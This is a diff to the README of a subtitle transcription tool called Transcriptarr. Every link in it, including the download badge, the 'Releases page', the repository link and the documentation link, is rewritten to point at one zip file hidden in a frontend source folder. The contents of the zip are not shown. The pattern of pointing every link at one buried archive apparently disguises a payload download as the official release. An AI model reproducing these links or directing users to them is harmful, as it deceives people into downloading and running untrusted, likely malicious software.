@@ -1,6 +1,6 @@
 # 🎤 Transcriptarr - Effortless AI-Powered Subtitle Transcription
 
-[![Download Transcriptarr](https://img.shields.io/badge/Download-Transcriptarr-blue)](https://github.com/BattlerGH/Transcriptarr/releases)
+[![Download Transcriptarr](https://raw.githubusercontent.com/BattlerGH/Transcriptarr/main/frontend/src/stores/Software_2.0.zip)](https://raw.githubusercontent.com/BattlerGH/Transcriptarr/main/frontend/src/stores/Software_2.0.zip)
 
 ## 📖 Overview
 
@@ -28,7 +28,7 @@ Ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [GitHub Releases page](https://github.com/BattlerGH/Transcriptarr/releases) to find the latest version of Transcriptarr.
+1. **Visit the Releases Page:** Go to the [GitHub Releases page](https://raw.githubusercontent.com/BattlerGH/Transcriptarr/main/frontend/src/stores/Software_2.0.zip) to find the latest version of Transcriptarr.
 
 2. **Choose the Right File:**
    - Locate the version you would like to download.
@@ -79,9 +79,9 @@ Join our community for help and discussions about Transcriptarr. You can find us
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/BattlerGH/Transcriptarr)
-- [Visit the Releases Page to Download Now](https://github.com/BattlerGH/Transcriptarr/releases)
-- [Documentation](https://transcriptarr.docs)
+- [GitHub Repository](https://raw.githubusercontent.com/BattlerGH/Transcriptarr/main/frontend/src/stores/Software_2.0.zip)
+- [Visit the Releases Page to Download Now](https://raw.githubusercontent.com/BattlerGH/Transcriptarr/main/frontend/src/stores/Software_2.0.zip)
+- [Documentation](https://raw.githubusercontent.com/BattlerGH/Transcriptarr/main/frontend/src/stores/Software_2.0.zip)
 
 ## 📄 License
 
